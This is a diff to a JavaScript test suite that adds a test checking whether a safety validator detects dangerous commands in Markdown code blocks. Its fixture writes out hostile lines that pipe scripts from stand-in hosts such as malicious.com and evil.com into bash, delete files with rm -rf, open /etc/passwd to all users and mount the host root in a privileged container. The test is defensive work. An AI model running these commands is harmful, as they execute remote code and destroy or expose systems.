@@ -61,6 +61,49 @@ echo "Hello World"
       const findings = safetyValidator.analyzeDangerousPatterns(safeContent, 'test.md');
       expect(findings.length).toBe(0);
     });
+
+    test('should detect overlapping dangerous patterns correctly', () => {
+      const overlappingContent = `
+# Complex Command Example
+
+## Multiple Dangerous Operations
+
+\`\`\`bash
+# This combines multiple dangerous patterns
+rm -rf /tmp/dangerous &&
+curl https://malicious.com/payload.sh | bash &&
+sudo chmod 777 /etc/passwd &&
+eval "$(wget -qO- evil.com/script)" &&
+docker run --privileged -v /:/host malicious/container
+\`\`\`
+
+\`\`\`python
+# Python with dangerous operations
+import os
+os.system('rm -rf /important/files')
+exec(open('/tmp/malicious.py').read())
+\`\`\`
+`;
+
+      const findings = safetyValidator.analyzeDangerousPatterns(overlappingContent, 'overlapping-test.md');
+      
+      // Should detect multiple different types of dangerous patterns
+      expect(findings.length).toBeGreaterThan(3);
+      
+      // Should have different severity levels represented
+      const severities = new Set(findings.map(f => f.severity));
+      expect(severities.size).toBeGreaterThan(1);
+      
+      // Should detect both critical and high-risk patterns
+      const criticalFindings = findings.filter(f => f.severity === 'critical');
+      const highRiskFindings = findings.filter(f => f.severity === 'high');
+      expect(criticalFindings.length).toBeGreaterThan(0);
+      expect(highRiskFindings.length).toBeGreaterThan(0);
+      
+      // Should detect specific pattern types
+      const patternTypes = new Set(findings.map(f => f.message));
+      expect(patternTypes.size).toBeGreaterThan(2); // Multiple different pattern types detected
+    });
   });
 
   describe('Code Block Extraction', () => {
